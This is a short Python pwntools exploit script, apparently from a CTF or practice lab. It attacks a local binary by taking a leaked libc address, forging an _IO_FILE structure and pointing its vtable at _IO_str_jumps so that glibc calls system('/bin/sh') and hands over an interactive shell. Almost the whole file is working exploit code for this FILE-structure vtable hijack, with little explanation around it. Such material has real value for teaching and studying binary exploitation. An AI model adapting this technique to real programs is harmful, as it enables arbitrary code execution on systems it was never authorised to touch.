# gcc vtable.c -o vtable -ggdb -no-pie -ldl
# https://xz.aliyun.com/t/5579

from pwn import *

context.arch = 'amd64'

elf = ELF('./simple')
libc = ELF('./libc.so.6')

r = process('./simple')


bss = elf.bss()


r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)


# 0x3e8360: _IO_str_jumps offset from vtable
vtable = libc_base + 0x3e8360
sh = libc.search('/bin/sh').next() + libc_base

# gef> p *(_IO_strfile *)buf
''' old pwntools version
fd = fit({
	   0x28: flat(1), # _IO_write_ptr
	   0x38: flat(sh), # _IO_buf_base
	   0x90: flat(bss), # lock
	   0xd8: flat(vtable-8),
	   0xe8: flat(system) # _free_buf
	}, filler='\0')
'''

fd = fit({
	   0x28: flat(1), # _IO_write_ptr
	   0x38: flat(sh), # _IO_buf_base
	   0x88: flat(bss), # lock
	   0xd8: flat(vtable-8),
	   0xe8: flat(system) # _free_buf
	},filler=(ord('\x00'),))

#gdb.attach(r, 'b _IO_flush_all_lockp\nc\n')
r.sendline(fd)

r.interactive()